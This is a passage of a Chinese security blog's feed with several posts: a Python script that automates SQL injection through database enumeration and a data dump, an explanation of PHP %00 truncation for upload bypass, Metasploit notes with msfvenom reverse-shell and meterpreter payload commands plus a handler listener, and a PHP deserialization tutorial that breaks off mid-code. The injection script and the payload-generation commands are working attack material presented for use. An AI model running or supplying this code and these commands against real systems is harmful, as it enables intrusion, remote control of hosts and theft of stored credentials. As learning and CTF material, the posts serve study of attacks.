class="comment"># 无引号</span></div><div class="line">        ret = <span class="string">"&#123;&#125; &#123;&#125;"</span>.format(url, payload)</div><div class="line">    <span class="keyword">elif</span> p_type == <span class="number">1</span>: <span class="comment"># 带引号</span></div><div class="line">        ret = <span class="string">"&#123;&#125;' &#123;&#125; #"</span>.format(url, payload)</div><div class="line">    <span class="keyword">return</span> urlencode(ret)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getResult</span><span class="params">(html)</span>:</span></div><div class="line">    <span class="string">'''使用正则取回显结果'''</span></div><div class="line">    re1 = <span class="string">'&#123;&#123;&#123;&#123;&#123;&#123;(.*)&#125;&#125;&#125;&#125;&#125;&#125;'</span> <span class="comment"># 第一次，把关键位置的HTML先取出来</span></div><div class="line">    ret = re.findall(re1, html)[<span class="number">0</span>]</div><div class="line">    <span class="keyword">return</span> ret</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSqlInje</span><span class="params">(url)</span>:</span></div><div class="line">    <span class="string">'''检查url是否存在注入，利用的是and 1=1，and 1=2方法'''</span></div><div class="line">    <span class="comment"># 不带引号的注入</span></div><div class="line">    target1 = CreatePayload(url, <span class="string">"and 9999=9999"</span>)</div><div class="line">    target2 = CreatePayload(url, <span class="string">"and 9999=9998"</span>)</div><div class="line">    <span class="keyword">if</span> getHTML(target1) != getHTML(target2):</div><div class="line">        <span class="keyword">print</span> <span class="string">"[***] 存在SQL注入漏洞，类型为数字型, --injetype=0"</span></div><div class="line">        <span class="keyword">return</span> <span class="number">0</span></div><div class="line">    <span class="comment"># 带引号的注入</span></div><div class="line">    target1 = CreatePayload(url, <span class="string">"and 9999=9999"</span>, <span class="number">1</span>)</div><div class="line">    target2 = CreatePayload(url, <span class="string">"and 9999=9998"</span>, <span class="number">1</span>)</div><div class="line">    <span class="keyword">if</span> getHTML(target1) != getHTML(target2):</div><div class="line">        <span class="keyword">print</span> <span class="string">"[***] 存在SQL注入漏洞，类型为字符型, --injetype=1"</span></div><div class="line">        <span class="keyword">return</span> <span class="number">1</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"[!!!] 不存在SQL注入漏洞"</span></div><div class="line">    <span class="keyword">return</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getColumsNum</span><span class="params">(url, p_type)</span>:</span></div><div class="line">    <span class="string">'''获取注入点的字段长度'''</span></div><div class="line">    <span class="comment"># 获取正常页面的body长度</span></div><div class="line">    payload = <span class="string">"order by 1"</span></div><div class="line">    target = CreatePayload(url, payload, p_type)</div><div class="line">    html_ok = getHTML(target)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">99</span>):</div><div class="line">        <span class="comment"># 获取加入payload的页面body长度</span></div><div class="line">        payload = <span class="string">" order by &#123;&#125;"</span>.format(i)</div><div class="line">        target = CreatePayload(url, payload, p_type)</div><div class="line">        html_test = getHTML(target)</div><div class="line">        <span class="keyword">if</span> html_ok != html_test:</div><div class="line">            <span class="comment"># 如果body和正常页面的不同，说明最终结果应该是当前字段数-1</span></div><div class="line">            colnum = i - <span class="number">1</span></div><div class="line">            <span class="keyword">print</span> <span class="string">"[***] 字段数为 &#123;&#125;, --colnum=&#123;&#125;"</span>.format(colnum, colnum)</div><div class="line">            <span class="keyword">return</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCurrentDBName</span><span class="params">(url, position, payload, p_type)</span>:</span></div><div class="line">    <span class="string">'''获取当前使用的数据库名称'''</span></div><div class="line">    inje = <span class="string">"database()"</span></div><div class="line">    payload = replacePosition(payload, position, inje) <span class="comment"># 替换回显位    </span></div><div class="line">    target = CreatePayload(url, payload, p_type) <span class="comment"># 生成最终提交的url</span></div><div class="line">    html = getHTML(target)   <span class="comment"># 提交</span></div><div class="line">    result = getResult(html) <span class="comment"># 获取结果</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"[***] 当前数据库名称 &#123;&#125; "</span>.format(result)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAllDBName</span><span class="params">(url, position, payload, p_type)</span>:</span></div><div class="line">    <span class="string">'''获取服务器上所有数据库名'''</span></div><div class="line">    inje = <span class="string">"distinct table_schema"</span></div><div class="line">    payload = replacePosition(payload, position, inje) <span class="comment"># 替换回显位</span></div><div class="line">    payload += <span class="string">" from information_schema.tables"</span> <span class="comment"># 补全后面的payload</span></div><div class="line">    target = CreatePayload(url, payload, p_type) <span class="comment"># 生成最终提交的url</span></div><div class="line">    <span class="keyword">print</span> target</div><div class="line">    html = getHTML(target)   <span class="comment"># 提交</span></div><div class="line">    result = getResult(html) <span class="comment"># 获取结果</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"[***] 所有数据库名称"</span></div><div class="line">    <span class="keyword">for</span> D_Name <span class="keyword">in</span> result.split(<span class="string">","</span>): <span class="comment"># 以,分割，然后遍历结果</span></div><div class="line">        <span class="keyword">print</span> <span class="string">"[D] &#123;&#125;"</span>.format(D_Name)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getTableName</span><span class="params">(url, position, payload, p_type, DBName)</span>:</span></div><div class="line">    inje = <span class="string">"table_name"</span></div><div class="line">    payload = replacePosition(payload, position, inje) <span class="comment"># 替换回显位</span></div><div class="line">    payload += <span class="string">" from information_schema.tables where table_schema='&#123;&#125;'"</span>.format(DBName) <span class="comment"># 补全后面的payload</span></div><div class="line">    target = CreatePayload(url, payload, p_type) <span class="comment"># 生成最终提交的url</span></div><div class="line">    html = getHTML(target)   <span class="comment"># 提交</span></div><div class="line">    result = getResult(html) <span class="comment"># 获取结果</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"[***] &#123;&#125; 中所有表"</span>.format(DBName)</div><div class="line">    <span class="keyword">for</span> T_Name <span class="keyword">in</span> result.split(<span class="string">","</span>): <span class="comment"># 以,分割，然后遍历结果</span></div><div class="line">        <span class="keyword">print</span> <span class="string">"[T] &#123;&#125;"</span>.format(T_Name)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getColumnName</span><span class="params">(url, position, payload, p_type, DBName, TableName)</span>:</span></div><div class="line">    inje = <span class="string">"column_name"</span></div><div class="line">    payload = replacePosition(payload, position, inje) <span class="comment"># 替换回显位</span></div><div class="line">    payload += <span class="string">" from information_schema.columns where table_schema='&#123;&#125;' and table_name='&#123;&#125;'"</span>.format(DBName, TableName)</div><div class="line">    target = CreatePayload(url, payload, p_type)</div><div class="line">    html = getHTML(target)   <span class="comment"># 提交</span></div><div class="line">    result = getResult(html) <span class="comment"># 获取结果</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"[***] &#123;&#125;.&#123;&#125; 中所有列"</span>.format(DBName, TableName)</div><div class="line">    <span class="keyword">for</span> C_Name <span class="keyword">in</span> result.split(<span class="string">","</span>): <span class="comment"># 以,分割，然后遍历结果</span></div><div class="line">        <span class="keyword">print</span> <span class="string">"[C] &#123;&#125;"</span>.format(C_Name)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getData</span><span class="params">(url, position, payload, p_type, DBName, TableName, ColumnName)</span>:</span></div><div class="line">    inje = ColumnName.replace(<span class="string">","</span>, <span class="string">",0x7c7c7c,"</span>) <span class="comment"># 在每列之间添加分隔符 |||</span></div><div class="line">    payload = replacePosition(payload, position, inje) <span class="comment"># 替换回显位</span></div><div class="line">    <span class="keyword">print</span> payload</div><div class="line">    payload += <span class="string">" from &#123;&#125;.&#123;&#125;"</span>.format(DBName, TableName)</div><div class="line">    target = CreatePayload(url, payload, p_type)</div><div class="line">    html = getHTML(target)   <span class="comment"># 提交</span></div><div class="line">    result = getResult(html) <span class="comment"># 获取结果</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"[***] &#123;&#125;.&#123;&#125; 中的数据"</span>.format(DBName, TableName)</div><div class="line">    x = PrettyTable(ColumnName.split(<span class="string">","</span>)) <span class="comment"># 创建表格，添加表头</span></div><div class="line">    x.align = <span class="string">"l"</span>                          <span class="comment"># 数据左对齐</span></div><div class="line">    <span class="keyword">for</span> data <span class="keyword">in</span>  getResult(html).split(<span class="string">","</span>):</div><div class="line">        x.add_row(data.split(<span class="string">"|||"</span>))       <span class="comment"># 以分隔符|||分割之后，向表中添加数据 </span></div><div class="line">    <span class="keyword">print</span> x                                <span class="comment"># 打印表格</span></div><div class="line">    </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    <span class="comment"># 参数解析, 路由</span></div><div class="line">    parser = OptionParser()</div><div class="line">    parser.add_option( <span class="string">"-u"</span>,<span class="string">"--url"</span>, action = <span class="string">"store"</span>, dest = <span class="string">"url"</span>, metavar = <span class="string">"URL"</span>,</div><div class="line">        help = <span class="string">"show all database name"</span>)</div><div class="line">    parser.add_option( <span class="string">"--check"</span>, action = <span class="string">"store_true"</span>, dest = <span class="string">"check"</span>, default = <span class="keyword">False</span>,</div><div class="line">        help = <span class="string">"check the url injection vuln"</span>)</div><div class="line">    parser.add_option( <span class="string">"--dbs"</span>, action = <span class="string">"store_true"</span>, dest = <span class="string">"dbs"</span>, default = <span class="keyword">False</span>,</div><div class="line">        help = <span class="string">"show all database name"</span>)</div><div class="line">    parser.add_option( <span class="string">"--tables"</span>, action = <span class="string">"store_true"</span>, dest = <span class="string">"tables"</span>, default = <span class="keyword">False</span>,</div><div class="line">        help = <span class="string">"show all table name in database"</span>)</div><div class="line">    parser.add_option( <span class="string">"--columns"</span>, action = <span class="string">"store_true"</span>, dest = <span class="string">"columns"</span>, default = <span class="keyword">False</span>,</div><div class="line">        help = <span class="string">"show all columns name in table"</span>)</div><div class="line">    parser.add_option( <span class="string">"--dump"</span>, action = <span class="string">"store_true"</span>, dest = <span class="string">"dump"</span>, default = <span class="keyword">False</span>,</div><div class="line">        help = <span class="string">"show data in table"</span>)</div><div class="line">    parser.add_option(<span class="string">"--injetype"</span>, action = <span class="string">"store"</span>, dest = <span class="string">"injetype"</span>, type=<span class="string">"string"</span>, metavar = <span class="string">"Inje_Type"</span>,</div><div class="line">        help = <span class="string">"Set the injection type,0=not dot, 1=has dot              eg. --injetype 0    --injetype=1"</span>)</div><div class="line">    parser.add_option(<span class="string">"--colnum"</span>, action = <span class="string">"store"</span>, dest = <span class="string">"colnum"</span>, type=<span class="string">"string"</span>, metavar = <span class="string">"COLUMN_NUM"</span>,</div><div class="line">        help = <span class="string">"Set the column number                                    eg. --Colnum 11     --Colnum=9"</span>)</div><div class="line">    parser.add_option(<span class="string">"--position"</span>, action = <span class="string">"store"</span>, dest = <span class="string">"position"</span>, type=<span class="string">"string"</span>, metavar = <span class="string">"position"</span>,</div><div class="line">        help = <span class="string">"Set the position                                         eg. --position 7    --position=4"</span>)</div><div class="line">    parser.add_option(<span class="string">"-D"</span>, action = <span class="string">"store"</span>, dest = <span class="string">"D_Name"</span>, type=<span class="string">"string"</span>, metavar = <span class="string">"DATABASE_NAME"</span>,</div><div class="line">        help = <span class="string">"Set the database name                                    eg. -D phplyb"</span>)</div><div class="line">    parser.add_option(<span class="string">"-T"</span>, action = <span class="string">"store"</span>, dest = <span class="string">"T_Name"</span>, type=<span class="string">"string"</span>, metavar = <span class="string">"TABLE_NAME"</span>,</div><div class="line">        help = <span class="string">"Set the table name                                       eg. -T admin"</span>)</div><div class="line">    parser.add_option(<span class="string">"-C"</span>, action = <span class="string">"store"</span>, dest = <span class="string">"C_Name"</span>, type=<span class="string">"string"</span>, metavar = <span class="string">"column,column"</span>,</div><div class="line">        help = <span class="string">"Set the database name                                    eg. -C id,username,password"</span>)</div><div class="line">    (options, args) = parser.parse_args() <span class="comment"># 创建参数</span></div><div class="line"></div><div class="line">    url = options.url</div><div class="line">    <span class="keyword">if</span> options.check == <span class="keyword">True</span>: <span class="comment"># 进入检查 --check</span></div><div class="line">        p_type = checkSqlInje(url)</div><div class="line">        <span class="keyword">if</span> p_type != <span class="keyword">None</span>:</div><div class="line">            getColumsNum(url, p_type)</div><div class="line">        exit()</div><div class="line">    p_type = int(options.injetype)  <span class="comment"># 获取注入类型 --injetype</span></div><div class="line">    position = options.position     <span class="comment"># 获取回显位   --position</span></div><div class="line">    colnum = int(options.colnum)    <span class="comment"># 获取字段数   --colnum</span></div><div class="line">    payload = CreateSelect(colnum)  <span class="comment"># 生成payload</span></div><div class="line">    <span class="keyword">if</span> options.dbs == <span class="keyword">True</span>:         <span class="comment"># 读取数据库 --dbs</span></div><div class="line">        getCurrentDBName(url, position, payload, p_type)</div><div class="line">        getAllDBName(url, position, payload, p_type)</div><div class="line">        exit()</div><div class="line">    DBName = options.D_Name         <span class="comment"># 获取数据库名  -D</span></div><div class="line">    <span class="keyword">if</span> options.tables == <span class="keyword">True</span>:      <span class="comment"># 读取表名     --tables</span></div><div class="line">        getTableName(url, position, payload, p_type, DBName)</div><div class="line">        exit()</div><div class="line">    TableName = options.T_Name      <span class="comment"># 获取表名     -T</span></div><div class="line">    <span class="keyword">if</span> options.columns == <span class="keyword">True</span>:     <span class="comment"># 读取列名     --columns</span></div><div class="line">        getColumnName(url, position, payload, p_type, DBName, TableName)</div><div class="line">        exit()</div><div class="line">    ColumnName = options.C_Name     <span class="comment"># 获取列名     -C</span></div><div class="line">    <span class="keyword">if</span> options.dump == <span class="keyword">True</span>:        <span class="comment"># 读取数据     --dump</span></div><div class="line">        getData(url, position, payload, p_type, DBName, TableName, ColumnName)</div><div class="line">        exit()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure><p>看完大佬的代码，简洁华丽，思路清晰，也许这就是我这种渣渣跟大佬的区别把。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;暑假在充实自己的时候，忙里偷闲（熬夜）写的一个针对简单的数字型注入的伪自动化脚本，道行尚浅，下面是我写的，然后再放一个大佬写的字符型和数字型都可以的 &lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="http://whc.dropsec.xyz/categories/Python/"/>
    
    
      <category term="SQL注入" scheme="http://whc.dropsec.xyz/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>理解%00截断原理</title>
    <link href="http://whc.dropsec.xyz/2017/07/03/%E7%90%86%E8%A7%A300%E6%88%AA%E6%96%AD%E5%8E%9F%E7%90%86/"/>
    <id>http://whc.dropsec.xyz/2017/07/03/理解00截断原理/</id>
    <published>2017-07-03T07:02:50.000Z</published>
    <updated>2017-07-19T10:13:03.201Z</updated>
    
    <content type="html"><![CDATA[<p>%00截断在以前的 ctf中挺常见的，但是现在也挺尴尬的，很少出现这个小小漏洞了。我又来批判自己了，这个简单原理最近才真正的搞懂了是咋回事，唉，写篇博客查漏补缺，补补自己不懂的地方。</p><a id="more"></a><h4 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h4><p><a href="http://www.tuicool.com/articles/zEVJbiI" target="_blank" rel="external">http://www.tuicool.com/articles/zEVJbiI</a></p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>划重点 <strong>PHP版本低于5.3.4</strong></p><p>%00截断有这么2种利用状况</p><ol><li>在url中加入%00，如<a href="http://xxxx/shell.php%00.jpg" target="_blank" rel="external">http://xxxx/shell.php%00.jpg</a></li><li>在burpsuite的16进制编辑工具将”shell.php .jpg”（带空格的）中间的空格由20改成00  </li></ol><p>url中的%00（只要是这种%xx）的形式，webserver会把它当作十六进制处理，然后哦吧16进制的hex自动翻译成ascii码值“NULL”,实现了截断<br>burpsuite中16进制编辑器将空格20改成了00，跟上面一样的变成asccii的null。</p><p>script1.php验证脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//''不会执行，""会执行</span></div><div class="line"><span class="keyword">for</span> ($k = <span class="number">0</span>; $k &lt;= <span class="number">255</span>; $k++) &#123;</div><div class="line">    $a = <span class="string">'shell.php'</span> . chr($k) . <span class="string">'.jpg'</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'k:'</span> . $k . <span class="string">'    '</span> . <span class="string">'$a:'</span> . $a . <span class="string">'     '</span> . <span class="string">'iconv("utf-8", "gbk", $a)'</span> . iconv(<span class="string">"UTF-8"</span>, <span class="string">"GBK//ignore"</span>, $a) . <span class="string">"&lt;br \&gt;"</span>;</div><div class="line"><span class="comment">//将字符串 $a从 utf8 转换编码到 gbk</span></div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>在5.3.2的PHP版本下执行这个脚本，其中iconv(“UTF-8”,”gbk”,$a)或是iconv(“UTF-8”,”gb2313”,$a)都会在chr(128)到chr(255)之间截断，结果就变成shell.php了。<br><img src="https://ooo.0o0.ooo/2017/07/03/5959ed6da5b73.png" alt=""></p><p>在高于5.3.4的版本下执行会报错，不会出现截断的结果</p><p><img src="https://ooo.0o0.ooo/2017/07/03/5959ed90332a6.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;%00截断在以前的 ctf中挺常见的，但是现在也挺尴尬的，很少出现这个小小漏洞了。我又来批判自己了，这个简单原理最近才真正的搞懂了是咋回事，唉，写篇博客查漏补缺，补补自己不懂的地方。&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://whc.dropsec.xyz/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://whc.dropsec.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>MSF学习笔记</title>
    <link href="http://whc.dropsec.xyz/2017/07/02/MSF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://whc.dropsec.xyz/2017/07/02/MSF学习笔记/</id>
    <published>2017-07-02T13:10:01.000Z</published>
    <updated>2017-07-06T12:22:40.878Z</updated>
    
    <content type="html"><![CDATA[<h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><blockquote><p>back  返回上一级<br>show +(tab tab) 显示框架模块<br>show exploits  显示exp<br>show payloads  显示载荷<br>show auxiliary 显示辅助攻击载荷<br>show targets 显示漏洞影响范围<br>show options  显示漏洞参数设置<br>search (漏洞编号)查找漏洞对应的exp<br>info显示模块详细信息<br>use 装载模块<br>run 运行exp                                       </p></blockquote><a id="more"></a><p>参数</p><blockquote><p>LHOST  靶机ip，可以让目标主机连接的IP地址<br>LPORT 设置攻击机端口<br>RHOST 远程主机或目标主机<br>RPORT 设置靶机端口                                         </p></blockquote><h3 id="scanner模块"><a href="#scanner模块" class="headerlink" title="scanner模块"></a>scanner模块</h3><blockquote><p>use scanner/smb/smb_version               扫描windows的smb版本信息<br>use scanner/ssh/ssh_version                  扫描ssh版本信息，对像攻击openssh有帮助<br>use scanner/ftp/ftp_version                   扫描ftp版本信息<br>use auxiliary/scanner/ftp/annoymous    检查ftp是否允许匿名登录</p></blockquote><h3 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h3><p>初探msf：<br><a href="http://www.xuebuyuan.com/1993953.html" target="_blank" rel="external">http://www.xuebuyuan.com/1993953.html</a><br>转Metasploit之Automated Persistent Backdoor<br><a href="http://www.evil0x.com/posts/26075.html" target="_blank" rel="external">http://www.evil0x.com/posts/26075.html</a></p><p>给靶机创建一个跟攻击机会话的模块，上面文章有关于内网渗透的</p><ul><li>用msfvenom生成木马</li></ul><p><strong>web端</strong></p><blockquote><p>msfvenom -p java/meterpreter/reverse_tcp LHOST 攻击机ip LPORT 攻击机端口 -f jar &gt;/root/<strong><em>.jar<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST 攻击机ip LPORT 攻击机端口 -f exe &gt;/root/</em></strong>.exe<br>msfvenom -p php/meterpreter/reverse_tcp LHOST 攻击机ip LPORT 攻击机端口 -f php &gt;/root/<em>*</em>.php<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST 攻击机ip  LPORT 攻击机端口 -f asp &gt; shell.asp JSP<br>msfvenom -p java/jsp_shell_reverse_tcp LHOST 攻击机ip LPORT 攻击机端口 -f war &gt; shell.war</p></blockquote><p><strong>反弹shell</strong>  </p><blockquote><p>msfvenom -p cmd/unix/reverse_python LHOST 攻击机ip LPORT 攻击机端口 -f raw &gt; shell.py  （python）<br>msfvenom -p cmd/unix/reverse_bash LHOST 攻击机ip LPORT 攻击机端口 -f raw &gt; shell.sh  （bash）<br>msfvenom -p cmd/unix/reverse_perl LHOST 攻击机ip LPORT 攻击机端口 -f raw &gt; shell.pl   （perl）</p></blockquote><ul><li>use exploit/multi/handler 监听内网反弹过来的shell</li></ul><blockquote><p>use exploit/multi/handler<br>set PAYLOAD <payload name=""><br>set LHOST <lhost value=""><br>set LPORT <lport value=""><br>set ExitOnSession false<br>exploit -j -z</lport></lhost></payload></p></blockquote><p>内网渗透，给拿到权限的机子，上传一个msf，然后用这个监听这个网段的（不是同一个网段用不了）</p><ul><li>meterpreter下可执行的操作</li></ul><blockquote><p>background            让meterpreter到后台<br>quit                         退出meterpreter会话<br>shell                        获取一个shell<br>irb                           开启ruby终端<br>screenshot              截屏<br>sysinfo                    获取操作系统的详细信息<br>ps                           获取进程列表<br>getuid                    查看权限<br>kill  uid                   杀进程<br>migrate  进程号       将meterpreter会话迁移到进程号<br>webcam_snap         拍照<br>shutdown               关机</p></blockquote><p>键盘窃听上面2篇文章都有</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;基本命令&quot;&gt;&lt;a href=&quot;#基本命令&quot; class=&quot;headerlink&quot; title=&quot;基本命令&quot;&gt;&lt;/a&gt;基本命令&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;back  返回上一级&lt;br&gt;show +(tab tab) 显示框架模块&lt;br&gt;show exploits  显示exp&lt;br&gt;show payloads  显示载荷&lt;br&gt;show auxiliary 显示辅助攻击载荷&lt;br&gt;show targets 显示漏洞影响范围&lt;br&gt;show options  显示漏洞参数设置&lt;br&gt;search (漏洞编号)查找漏洞对应的exp&lt;br&gt;info显示模块详细信息&lt;br&gt;use 装载模块&lt;br&gt;run 运行exp                                       &lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="工具" scheme="http://whc.dropsec.xyz/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="渗透测试" scheme="http://whc.dropsec.xyz/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化漏洞理解与利用</title>
    <link href="http://whc.dropsec.xyz/2017/06/15/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%90%86%E8%A7%A3%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
    <id>http://whc.dropsec.xyz/2017/06/15/PHP反序列化漏洞理解与利用/</id>
    <published>2017-06-15T12:31:56.000Z</published>
    <updated>2017-07-03T03:12:38.279Z</updated>
    
    <content type="html"><![CDATA[<p>根据合天实验室上面的实验，我从以前对序列化漏洞的乱七八糟的理解变得清晰起来了。顺便吐槽下最近的自己，没学过java就直接去看struts2的原理性漏洞，头痛。</p><a id="more"></a><h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p><a href="http://www.tuicool.com/articles/F3iYbaZ" target="_blank" rel="external">http://www.tuicool.com/articles/F3iYbaZ</a><br><a href="http://blog.csdn.net/qq_32400847/article/details/53873275" target="_blank" rel="external">http://blog.csdn.net/qq_32400847/article/details/53873275</a><br><a href="http://www.hetianlab.com/expc.do?ce=cb6878ee-c92c-4a7e-bdd1-bb7bf7891f5a" target="_blank" rel="external">http://www.hetianlab.com/expc.do?ce=cb6878ee-c92c-4a7e-bdd1-bb7bf7891f5a</a></p><h3 id="magic函数"><a href="#magic函数" class="headerlink" title="magic函数"></a>magic函数</h3><p>php面向对象编程中有一类特殊的函数叫做magic函数，在特定的条件下会执行这些magic函数的内容，比如创建、销毁对象的时候。</p><blockquote><p><code>__construct()</code>当一个对象创建时调用 (constructor)<br><code>__destruct()</code>当一个对象被销毁时调用 (destructor)<br><code>__toString()</code>当一个对象被当作一个字符串使用<br><code>__wakeup()</code>当一个是字符串被反序列化的时候被调用<br><code>__sleep()</code>当一个对象被序列化的时候被调用</p></blockquote><p>上一段代码来阐述魔法函数到底是咋回事儿。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></div><div class="line"><span class="class"></span>&#123;     <span class="comment">//一个变量（被称为属性）</span></div><div class="line">     <span class="keyword">public</span> $variable =<span class="string">'This is a string!'</span>;</div><div class="line">     <span class="comment">//一个函数（被称为方法）</span></div><div class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">PrintVariable</span><span class="params">()</span></span></div><div class="line"><span class="function">     </span>&#123;</div><div class="line">          <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;variable.<span class="string">'&lt;br /&gt;'</span>;</div><div class="line">     &#125;</div><div class="line">     <span class="comment">//构造函数</span></div><div class="line">     <span class="keyword">public</span> funtion __construct()</div><div class="line">     &#123;</div><div class="line">          <span class="keyword">echo</span> <span class="string">'__construct&lt;br /&gt;'</span>;</div><div class="line">     &#125;</div><div class="line">     <span class="comment">//析构函数</span></div><div class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line"><span class="function">     </span>&#123;</div><div class="line">          <span class="keyword">echo</span> <span class="string">'__destruct&lt;br /&gt;'</span>;</div><div class="line">     &#125;</div><div class="line">     <span class="comment">//变成字符串时</span></div><div class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></div><div class="line"><span class="function">     </span>&#123;</div><div class="line">          <span class="keyword">return</span> <span class="string">'__toString&lt;br /&gt;'</span>;</div><div class="line">     &#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">//创建对象，__construct会被调用</span></div><div class="line">$object = <span class="keyword">new</span> Test();</div><div class="line"></div><div class="line"><span class="comment">//调用一个方法，方法函数体内的函数会被调用</span></div><div class="line">$object-&gt;PrintVariable();</div><div class="line"></div><div class="line"><span class="comment">//对象被当成一个字符串，__toString会被调用</span></div><div class="line"><span class="keyword">echo</span> $object;</div><div class="line"></div><div class="line"><span class="comment">//脚本结束，__destruct会被调用 </span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>验证<br><img src="https://ooo.0o0.ooo/2017/07/02/5958ea16e89e2.png" alt=""></p><h3 id="什么是序列化"><a href="#什么是序列化" class="headerlink" title="什么是序列化"></a>什么是序列化</h3><p>PHP （从 PHP 3.05 开始）为保存对象提供了一组序列化和反序列化的函数：serialize、unserialize。不过在 PHP 手册中对这两个函数的说明仅限于如何使用，而对序列化结果的格式却没做任何说明。</p><p>把复杂的数据类型压缩到一个字符串中</p><p>serialize() 把变量和它们的值编码成文本形式</p><p>unserialize() 恢复原先变量</p><p>下面是序列化中字母对应的类型</p><blockquote><p>a - array 数组<br>b - boolean布尔型<br>d - double双精度型<br>i - integer<br>o - common object一般对象<br>r - reference<br>s - string<br>C - custom object 自定义对象<br>O - class<br>N - null<br>R - pointer reference<br>U - unicode string unicode编码的字符串</p></blockquote><ol><li>序列化数组</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$stooges = <span class="keyword">array</span>(<span class="string">'Moe'</span>,<span class="string">'Larry'</span>,<span class="string">'Curly'</span>);</div><div class="line">$new = serialize($stooges);</div><div class="line">print_r($new);</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</div><div class="line">print_r(unserialize($new));</div></pre></td></tr></table></figure><p>结果：</p><blockquote><p>a:3:{i:0;s:3:”Moe”;i:1;s:5:”Larry”;i:2;s:5:”Curly”;} //i表示数组第几个，s表示字符个数<br>Array ( [0] =&gt; Moe [1] =&gt; Larry [2] =&gt; Curly )</p></blockquote><p>当把这些序列化的数据放在URL中在页面之间会传递时，需要对这些数据调用urlencode()，以确保在其中的URL元字符进行处理：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$shopping = <span class="keyword">array</span>(<span class="string">'Poppy seed bagel'</span> =&gt; <span class="number">2</span>,<span class="string">'Plain Bagel'</span> =&gt;<span class="number">1</span>,<span class="string">'Lox'</span> =&gt;<span class="number">4</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;a 